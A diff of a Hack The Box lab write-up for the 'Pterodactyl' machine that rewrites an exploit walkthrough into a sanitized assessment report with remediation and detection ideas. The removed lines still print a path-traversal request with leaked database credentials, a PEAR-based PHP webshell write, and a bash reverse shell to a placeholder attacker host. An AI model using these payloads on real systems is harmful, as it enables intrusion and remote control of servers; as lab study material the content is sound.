@@ -1,157 +1,100 @@
-<div align="center">
+# Pterodactyl — Security Assessment
 
-# 🦖 HTB: Pterodactyl
+| Field | Value |
+| --- | --- |
+| Platform | Hack The Box |
+| Operating system | Linux |
+| Difficulty | Medium |
+| Assessment date | 2026-02-07 (from existing notes; timezone not recorded) |
+| Author | Dylan Senez / d4rkgunn3r |
+| Review status | Proposed revision; publication eligibility and evidence review pending |
 
-![OS](https://img.shields.io/badge/OS-Linux-FCC624?style=flat-square&logo=linux&logoColor=black)
-![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=flat-square)
-![Status](https://img.shields.io/badge/Status-Rooted-success?style=flat-square)
+## 1. Executive summary
 
-`hackthebox` `linux` `lfi` `pearcmd-rce` `cve-2021-3802` `udisks2`
+The notes report application file disclosure leading to execution as wwwrun, followed by a reported local udisks2 race and root context.
 
-</div>
+## 2. Scope and authorization
 
----
+This account concerns the assigned HTB laboratory target only. Target addresses, VPN information, secrets, and flag contents are excluded. This revision analyzes recorded work; no assessment commands were executed during the editorial review. Machine retirement status has not been freshly verified.
 
-> **TL;DR** — A locale-switching endpoint has an unauthenticated path-traversal bug that reads arbitrary files, which leaks database creds outright. Chained with PHP's PEAR command-line tool (also reachable via the same LFI), that traversal turns into a webshell and RCE. From there, a known `udisks2` race condition (CVE-2021-3802) gets you root.
+## 3. Methodology and reproducibility
 
-## 📋 Box Info
+Discovery → service analysis → recorded access path → privilege/impact assessment → evidence review → remediation. Commands below support authorized discovery and identity verification. Exploitation is described at the finding level; operational payloads and secret-extraction procedures are omitted.
 
-| | |
-|---|---|
-| 🖥️ **OS** | Linux |
-| 🎯 **Target** | `<TARGET_IP>` (pterodactyl.htb) |
-| 🎚️ **Difficulty** | Medium |
-| 📅 **Date** | February 7, 2026 |
-| 🏁 **Outcome** | ✅ Full compromise |
-
-## 🔍 Recon
+Set the address of the currently assigned lab instance before discovery:
 
 ```bash
-nmap -sV -sC -p- <TARGET_IP> -T3 --min-rate 5000
+export TARGET_IP='REPLACE_WITH_ASSIGNED_LAB_IP'
+mkdir -p evidence/pterodactyl/{scans,screenshots}
+nmap -sV -p 22,80 -oA evidence/pterodactyl/scans/services "$TARGET_IP"
 ```
 
-| Port | Service |
-|:---:|---|
-| `22` | OpenSSH 9.6 |
-| `80` | nginx 1.21.5 — "My Minecraft Server" |
+This is a proposed targeted confirmation command, not the original full-port scan. Nmap creates traffic and local output files. Record tool versions, instance date, and timezone; compare results with the observations below rather than assuming the same services are still present.
 
-Virtual host enumeration turns up `panel.pterodactyl.htb` — the actual admin panel, running **Pterodactyl Panel** (a Laravel-based game-server management app).
+## 4. Reconnaissance and service analysis
 
----
+22 OpenSSH 9.6; 80 nginx 1.21.5. A separate panel virtual host exposed a Laravel-based application.
 
-## 🚩 Shell as `wwwrun` — LFI → PEAR → RCE
+> **EV-001 — Evidence placeholder:** add the reviewed service-scan excerpt and screenshot here. Remove sensitive identifiers. No screenshot file is claimed to exist at this placeholder.
 
-### Finding the traversal
+## 5. Recorded initial-access path
+
+The localization handler reportedly read outside its intended directory boundary and disclosed database configuration. The notes describe subsequent PHP execution through development tooling. Original request/response evidence is needed to verify precise behavior.
+
+> **EV-002 — Evidence placeholder:** add a sanitized artifact establishing the behavior and resulting identity. An HTTP success response or tool success message alone does not prove code execution.
+
+## 6. Privilege escalation and impact validation
+
+The narrative associates root access with CVE-2021-3802 and shows a root-context transcript. The transition from wwwrun to phileasfogg3 is not explained. Exact host package build, prerequisites, and CVE applicability remain unresolved.
+
+In an already authorized session, record identity without reading objective contents:
 
 ```bash
-curl "http://panel.pterodactyl.htb/locales/locale.json?locale=../../../pterodactyl&namespace=config/database"
+id
+hostname
+sudo -l
 ```
 
-The `locale`/`namespace` parameters go straight into a file read with no sanitization:
+These are proposed identity-verification commands, not a claim of rerunning the assessment. Windows privilege enumeration does not prove successful elevation; Linux sudo policy alone does not prove a root session.
 
-```json
-{"../../../pterodactyl":{"config/database":{"connections":{"mysql":{
-  "host":"127.0.0.1","port":"3306","database":"panel",
-  "username":"pterodactyl","password":"PteraPanel"
-}}}}}
-```
+> **EV-003 — Evidence placeholder:** add policy/permission evidence and the resulting identity or access proof. Never include flags, tokens, private keys, hashes of credentials, or password values.
 
-Plaintext DB creds, straight off the config file — `pterodactyl : PteraPanel` against MySQL on `127.0.0.1:3306`.
+## 7. Evidence register and limitations
 
-> ⚠️ **Root cause:** unvalidated `locale`/`namespace` parameters passed into a file-read function. Classic path traversal (CWE-22), made worse here by sensitive config living inside the web root's reach.
+| ID | Required artifact | Current status |
+| --- | --- | --- |
+| EV-001 | Service inventory and timestamped scan excerpt | Text observations available; original artifact review pending |
+| EV-002 | Initial-access behavior and identity proof | Existing narrative reviewed; sanitized artifact pending |
+| EV-003 | Privilege boundary and impact proof | Reported in narrative; original artifact review pending |
 
-### Turning LFI into RCE via PEAR
+Root context reported; user transition and original local-exploitation evidence are missing.
 
-PHP installs commonly ship `/usr/share/php/PEAR/pearcmd.php`. If it's includable via the same LFI, its `config-create` command can be abused to **write** a file — including a PHP webshell — anywhere the web server user can write.
+The source is [the existing repository note](https://github.com/Dylans7j/HackTheBox-Walkthroughs/blob/main/pterodactyl.md), reviewed at blob SHA `7511051d575da6d9c710180b1599401e16f0d864`, plus [the repository source review](./EVIDENCE-REVIEW.md). 
 
-**Step 1 — write the webshell to `/tmp/sh.php`:**
+A Rooted status is not a substitute for a terminal transcript. Reported results are attributed to the existing notes; they have not been independently reproduced in this review. CVE numbers, fixed-version claims, unsupported timing claims, and numerical severity scores are withheld where primary-source verification is missing.
 
-```bash
-curl -g "http://panel.pterodactyl.htb/locales/locale.json?+config-create+/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/<?=\`\$_GET[c]\`?>+/tmp/sh.php"
-```
+## 8. Findings and remediation
 
-```
-Successfully created default configuration file "/tmp/sh.php"
-```
+| ID | Finding / review target | Remediation |
+| --- | --- | --- |
+| F-001 | File traversal/disclosure | Use fixed localization identifiers, canonical path checks, and least-privilege file access. |
+| F-002 | Production development tooling | Remove unnecessary command-line development components; segregate writable content from executable PHP paths. |
+| F-003 | Local privileged-service vulnerability | Verify installed package applicability, apply vendor-supported fixes, and remove unnecessary privileged storage services. |
 
-**Step 2 — trigger it through the same LFI, now pointed at `/tmp`:**
+Prioritize the boundary failures that enable access or elevation. Set final severity after confirming prerequisites, affected privileges, and original evidence.
 
-```bash
-curl -g "http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../../tmp&namespace=sh&c=id"
-```
+## 9. Detection opportunities
 
-```
-uid=474(wwwrun) gid=477(www) groups=477(www)
-```
+Unexpected localization paths; PHP writes outside normal content flow; udisks2/polkit activity and unexpected privileged execution. Tune against storage administration.
 
-Command execution confirmed. Upgrade to an interactive shell:
+Collect relevant application, authentication, process, and file-change logs. Correlate events by account, host, and time; a single suspicious request is not proof of successful compromise. These are detection proposals, not tested rules or observed telemetry.
 
-```bash
-# listener: nc -lvnp 1337
-curl -g "http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../../tmp&namespace=sh&c=bash+-c+'bash+-i+>%26+/dev/tcp/<ATTACKER_IP>/1337+0>%261'"
-```
+## 10. Remediation validation
 
-```
-wwwrun@pterodactyl:/var/www/pterodactyl/public$
-```
+Verify corrected permissions and authentication/authorization policy using approved test accounts and administrative configuration review. Confirm exposed secrets were rotated and removed from distributed artifacts. Validate that legitimate workflows still function and monitoring captures permitted test activity. Preserve before/after evidence without exposing sensitive values.
 
-```bash
-cat /home/phileasfogg3/user.txt
-<USER_FLAG_REDACTED>
-```
+## 11. Lessons learned and remaining work
 
-**Artifacts:** `EV-002` (LFI DB-config disclosure) · webshell write/execute transcripts above
+Use observed identities and access results to establish impact. Keep service exposure separate from validated weaknesses and distinguish suggested methods from executed steps. Before publication, resolve the gaps in Sections 5–7, verify platform permission, and review every image and output for secrets.
 
----
-
-## 👑 Root — CVE-2021-3802 (udisks2 XFS Race)
-
-`udisks2` handles disk/filesystem mounting and has historically run with elevated privileges via polkit. CVE-2021-3802 is a race condition in how it resizes XFS filesystems — win the race, and you get code execution as root.
-
-**Attack summary:**
-1. Build a malicious XFS filesystem image containing a SUID-root `bash`, on the attacker box.
-2. Transfer the ~300MB image to the target via SCP.
-3. Set the PAM/polkit environment variables needed for an authenticated session.
-4. `udisksctl loop-setup` to mount the image as a loop device.
-5. Trigger the race via a `gdbus` call to the Filesystem `Resize` method.
-6. Race window hits → SUID bash gets written out under `/tmp/`.
-
-```bash
-phileasfogg3@pterodactyl:/tmp$ /tmp/blockdev.IL6OK3/bash -p
-bash-5.3# whoami
-root
-```
-
-```bash
-root@pterodactyl:/tmp# cat /root/root.txt
-<ROOT_FLAG_REDACTED>
-```
-
-> 💡 This is a known, patched CVE — the takeaway for defense is simply: **keep `udisks2` patched.** No amount of app-layer hardening on Pterodactyl Panel would have stopped this once local access was gained.
-
----
-
-## ✅ Proof of Compromise
-
-| Flag | Value |
-|---|---|
-| User | `<USER_FLAG_REDACTED>` |
-| Root | `<ROOT_FLAG_REDACTED>` |
-| Status | ✅ **PWNED** |
-
-## 🛠️ Remediation
-
-| Finding | Fix |
-|---|---|
-| LFI in `/locales/locale.json` | Whitelist allowed `locale`/`namespace` values; canonicalize and reject traversal sequences; move config outside the web root. |
-| DB credentials in plaintext config | Rotate immediately; use a secrets manager or encrypted env vars; least-privilege DB accounts. |
-| PEAR CLI reachable via app user | Remove PEAR CLI tooling from production hosts; it has no business being reachable by a web app. |
-| `udisks2` CVE-2021-3802 | Patch to a fixed `udisks2` version — this is a known, disclosed CVE with vendor fixes available. |
-
----
-
-<div align="center">
-
-*Part of the [D4RKGUNN3R Hack The Box Walkthroughs](../) series.*
-
-</div>
+[Back to walkthrough inventory](./README.md)
